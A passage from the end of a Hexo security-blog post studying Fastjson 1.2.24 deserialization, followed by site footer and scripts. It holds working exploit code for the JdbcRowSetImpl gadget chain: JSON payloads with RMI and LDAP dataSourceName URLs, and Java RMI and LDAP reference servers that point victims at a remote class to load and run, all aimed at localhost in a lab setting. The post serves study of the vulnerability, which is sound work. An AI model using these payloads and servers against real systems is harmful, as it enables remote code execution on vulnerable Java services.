+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String payload = &quot;&#123;&quot; +</span><br><span class="line">        &quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +</span><br><span class="line">        &quot;\&quot;dataSourceName\&quot;:\&quot;ldap://xxx\&quot;, &quot; +</span><br><span class="line">        &quot;\&quot;autoCommit\&quot;:1&quot; +</span><br><span class="line">        &quot;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="RMI-Jndi"><a href="#RMI-Jndi" class="headerlink" title="RMI+Jndi"></a>RMI+Jndi</h4><p>server:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import javax.naming.InitialContext;</span><br><span class="line">import javax.naming.Reference;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class JNDI &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        InitialContext initialContext = new InitialContext();</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Reference reference = new Reference(&quot;zGZLUXzF&quot;,&quot;zGZLUXzF&quot;,&quot;http://127.0.0.1:8085/&quot;);</span><br><span class="line">        initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fastjson</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    String payload = &quot;&#123;&quot; +</span><br><span class="line">            &quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +</span><br><span class="line">            &quot;\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, &quot; +</span><br><span class="line">            &quot;\&quot;autoCommit\&quot;:1&quot; +</span><br><span class="line">            &quot;&#125;&quot;;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750428293986-5abbb4de-8f3c-4b44-90d5-6533804235b7.png"></p>
+<h4 id="ldap-Jndi"><a href="#ldap-Jndi" class="headerlink" title="ldap+Jndi"></a>ldap+Jndi</h4><p>server</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">package org.example.jndi;</span><br><span class="line"></span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line">import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line">import com.unboundid.ldap.sdk.Entry;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line">import com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line">import com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line">import javax.net.ServerSocketFactory;</span><br><span class="line">import javax.net.SocketFactory;</span><br><span class="line">import javax.net.ssl.SSLSocketFactory;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">public class jndi_ldap &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main ( String[] tmp_args ) &#123;</span><br><span class="line">        String[] args=new String[]&#123;&quot;http://127.0.0.1:8085/#zGZLUXzF&quot;&#125;;</span><br><span class="line">        int port = 9999;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;, //$NON-NLS-1$</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        catch ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;</span><br><span class="line"></span><br><span class="line">        private URL codebase;</span><br><span class="line"></span><br><span class="line">        public OperationInterceptor ( URL cb ) &#123;</span><br><span class="line">            this.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;</span><br><span class="line">            String base = result.getRequest().getBaseDN();</span><br><span class="line">            Entry e = new Entry(base);</span><br><span class="line">            try &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            catch ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;</span><br><span class="line">            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));</span><br><span class="line">            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);</span><br><span class="line">            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);</span><br><span class="line">            String cbstring = this.codebase.toString();</span><br><span class="line">            int refPos = cbstring.indexOf(&#x27;#&#x27;);</span><br><span class="line">            if ( refPos &gt; 0 ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(0, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);</span><br><span class="line">            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); //$NON-NLS-1$</span><br><span class="line">            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>fastjson</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">    String payload = &quot;&#123;&quot; +</span><br><span class="line">            &quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +</span><br><span class="line">            &quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zGZLUXzF\&quot;, &quot; +</span><br><span class="line">            &quot;\&quot;autoCommit\&quot;:1&quot; +</span><br><span class="line">            &quot;&#125;&quot;;</span><br><span class="line">    JSON.parse(payload);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750428349436-bb024c3f-18bb-4163-aa66-b39732d7e03a.png"></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                Fastjson基础&amp;1.2.24反序列化学习
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/06/06/Fastjson基础&amp;1.2.24反序列化学习/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-06-06 22:50</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/06/23/Geoserver%E6%9C%AA%E6%8E%88%E6%9D%83XXE(CVE-2025-30220)%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"
+                                   title="Geoserver未授权XXE(CVE-2025-30220)漏洞代码分析"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Geoserver未授权XXE(CVE-2025-30220)漏洞代码分析</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/05/30/WMCTF2023-ez_java_again(RMIConnector%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/"
+                                   title="WMCTF2023-ez_java_again(RMIConnector二次反序列化)"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">WMCTF2023-ez_java_again(RMIConnector二次反序列化)</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson%E5%9F%BA%E7%A1%80-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0"><span class="nav-text">Fastjson基础&amp;1.2.24反序列化学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-text">Demo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8setter-getter%E6%96%B9%E6%B3%95%E5%8E%9F%E7%90%86"><span class="nav-text">反序列化调用setter&#x2F;getter方法原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#setter%E6%96%B9%E6%B3%95"><span class="nav-text">setter方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Properties%E7%9A%84getter%E6%96%B9%E6%B3%95"><span class="nav-text">Properties的getter方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-24"><span class="nav-text">fastjson-1.2.24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">TemplatesImpl利用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">JdbcRowSetImpl利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI-Jndi"><span class="nav-text">RMI+Jndi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ldap-Jndi"><span class="nav-text">ldap+Jndi</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Fastjson%E5%9F%BA%E7%A1%80-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0"><span class="nav-text">Fastjson基础&amp;1.2.24反序列化学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-text">Demo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8setter-getter%E6%96%B9%E6%B3%95%E5%8E%9F%E7%90%86"><span class="nav-text">反序列化调用setter&#x2F;getter方法原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#setter%E6%96%B9%E6%B3%95"><span class="nav-text">setter方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Properties%E7%9A%84getter%E6%96%B9%E6%B3%95"><span class="nav-text">Properties的getter方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson-1-2-24"><span class="nav-text">fastjson-1.2.24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">TemplatesImpl利用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">JdbcRowSetImpl利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI-Jndi"><span class="nav-text">RMI+Jndi</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ldap-Jndi"><span class="nav-text">ldap+Jndi</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
